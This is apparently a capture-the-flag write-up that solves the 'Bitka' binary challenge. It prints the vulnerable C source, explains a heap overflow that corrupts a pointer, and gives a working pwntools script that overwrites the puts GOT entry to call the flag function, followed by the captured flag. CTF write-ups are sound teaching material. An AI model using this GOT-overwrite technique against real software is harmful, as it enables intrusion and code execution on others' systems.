# Bitka (200 points)

We are given the following code 

```c
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>

struct combatant
{
    char name[16];
    int class;
    int age;
    char *background;
};

void createCombatant(struct combatant *combatant);
void battle(struct combatant *combatant1, struct combatant *combatant2);
void trueWinner();

int main(int argc, char const *argv[])
{
    struct combatant *combatant1;
    struct combatant *combatant2;
    combatant1 = (struct combatant *)malloc(sizeof(struct combatant));
    combatant1->background = (char *)malloc(64);
    combatant2 = (struct combatant *)malloc(sizeof(struct combatant));
    combatant2->background = (char *)malloc(64);

    puts("TODO");
    fflush(stdout);
    sleep(1);
    puts("Napravite prvog borca!");
    createCombatant(combatant1);
    puts("Prvi borac napravljen. Sada drugi...");
    createCombatant(combatant2);
    puts("Drugi borac napravljen!");

    battle(combatant1, combatant2);

    return 0;
}

void createCombatant(struct combatant *combatant)
{
    fputs("Ime (max. 15 znakova): ", stdout);
    scanf("%15s",combatant->name);
    int redo;
    do
    {
        redo = 0;
        fputs("Odaberite klasu:\n1) Vitez\n2) Carobnjak\n3) Strijelac\n> ", stdout);
        char class[10];
        scanf("%9s",class);
        for (int i = 0; class[i]; i++)
            *class = tolower(*class);
        if (strcmp("vitez", class) == 0)
            combatant->class = 0;
        else if (strcmp("carobnjak", class) == 0)
            combatant->class = 1;
        else if (strcmp("strijelac", class) == 0)
            combatant->class = 2;
        else
        {
            puts("Klasa ne postoji, pokuÅ¡ajte ponovno...");
            sleep(1);
            redo = 1;
        }
    } while (redo == 1);
    fputs("Dob: ", stdout);
    scanf("%d",&combatant->age);
    fputs("Biografija: ",stdout);
    scanf("%150s",combatant->background);
}

void battle(struct combatant *combatant1, struct combatant *combatant2)
{
    puts("Bitka zapocinje.");
    sleep(1);
    puts("Chin, pft, plow...");
    fflush(stdout);
    sleep(1);
    srand(time(NULL));
    int winner = rand() % 2;
    struct combatant *victor;
    if (winner == 0)
        victor = combatant1;
    else
        victor = combatant2;
    printf("Bitka je bila duga i teska, ali na vrhu jest ostao %s\n\n", victor->name);

    char picture[1000];
    FILE *f;
    if (victor->class == 0)
        f = fopen("./knight", "r");
    else if (victor->class == 1)
        f = fopen("./wizard", "r");
    else
        f = fopen("./archer", "r");

    
    for(int i = 0;!feof(f);i++) {
        picture[i]=fgetc(f);
    }
    fclose(f);
    puts(picture);
}

void trueWinner(){
    FILE *f;
    f = fopen("./flag.txt","r");
    char flag[100];
    fgets(flag,100,f);
    printf("%s",flag);
}

```

From the looks of it we are going to have to do something with the `malloc`-ed memory.

We can see that this line 

```c
scanf("%150s",combatant->background);
```

scans 150 chars into a memory location which has only been allocated enough space for 64 chars here

```c
combatant1->background = (char *)malloc(64);
```

However since this is located on the [heap](https://en.wikipedia.org/wiki/Heap_(data_structure)) we can't do a buffer overflow. 

Let's try inputing a cyclic pattern of length 150 and see what happens
![gdb](https://i.imgur.com/UxlyXUc.png)

Bingo, we get a segfault which means that we are somehow overwriting an important piece of data.
Looking at the backtrace
![backtrace](https://i.imgur.com/BjmVo0b.png)

we find that the segfault happens at the second scanf.

So what is happening here?

![diagram](https://i.imgur.com/k5NGa6u.png)

Normally the second background pointer would point to the second combatants background, but since we have overflowed the previous combatants background it changes the address that the second pointer points to.
The program then asks us for the second combatants biography and tries writing it to this (now gibberish) address, causing a segfault. 

This allows us to write 150 chars worth of data to any arbitrary address of our choosing as long as it isn't write protected.
Since the goal here is to redirect execution to the `trueWinner` function, we can overwrite the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) entry of another function so it points to the `trueWinner` function.

The `puts` function is called right after `createCombatant` so it's the best candidate to overwrite. Let's write our exploit code


```python
from pwn import *

elf = ELF('./bitka')

payload = b'A' *  cyclic_find('caab')     # padding
payload += p64(elf.got['puts'])           # target address of second scanf

payload2 = p64(elf.symbols['trueWinner']) # overwrite puts entry with trueWinner

r = remote(b'chal.hackultet.hr', 13018)
r.recvuntil(b': ')
r.sendline(b'name')
r.recvuntil(b'> ')
r.sendline(b'vitez')
r.recvuntil(b': ')
r.sendline(b'21')
r.recvuntil(b': ')
r.sendline(payload)                       # overwrite pointer

r.recvuntil(b': ')
r.sendline(b'name 2')
r.recvuntil(b'> ')
r.sendline(b'carobnjak')
r.recvuntil(b': ')
r.sendline(b'21')
r.recvuntil(b': ')
r.sendline(payload2)                      # overwrite GOT entry

r.interactive()
```
Running it on the server

```text
[+] Opening connection to b'chal.hackultet.hr' on port 13018: Done
[*] Switching to interactive mode
CTF2024[648369071467]CTF2024[648369071467]CTF2024[648369071467]Bitka je bila duga i teska, ali na vrhu jest ostao name

CTF2024[648369071467][*] Got EOF while reading in interactive
```

------------------

Useful resources:

[heap overflow (hacktricks)](https://book.hacktricks.xyz/binary-exploitation/heap/heap-overflow)

[heap overflow (northwestern.edu)](http://hamsa.cs.northwestern.edu/readings/heap-overflows/)
